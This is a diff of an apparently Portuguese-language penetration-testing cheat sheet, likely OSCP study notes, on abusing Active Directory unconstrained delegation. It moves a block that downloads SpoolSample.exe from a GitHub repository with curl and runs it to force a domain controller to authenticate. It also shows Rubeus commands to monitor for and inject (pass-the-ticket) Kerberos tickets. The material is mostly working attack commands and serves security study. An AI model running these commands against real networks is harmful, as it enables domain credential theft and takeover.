@@ -1345,13 +1345,14 @@ Rubeus.exe ptt /ticket:sdjadjaspjdapsidpsaijpiasdiasjDCCBdygAwI9DQUw=
 Invoke-Rubeus 'ptt /ticket:sdjadjaspjdapsidpsaijpiasdiasjDCCBdygAwI9DQUw='
 ```
 ##### UNCONSTRAINED DELEGATION RUBEUS - FORÇAR COMPUTADOR A SE AUTENTICAR EM OUTRO
-```
-curl https://github.com/n0ts0cial/oscp/raw/main/SpoolSample.exe -Outfile SpoolSample.exe
-.\SpoolSample.exe tech-dc01 server02
-```
 LEMBRAR DE MONITORAR COM O RUBEUS ANTES:
 ```
 .\Rubeus.exe  monitor /interval:5 /nowrap
+```
+FORÇAR COMPUTADOR A SE AUTENTICAR NO OUTRO
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/SpoolSample.exe -Outfile SpoolSample.exe
+.\SpoolSample.exe tech-dc01 server02
 ```
 IMPORTAR O TICKET DO DC:
 ```
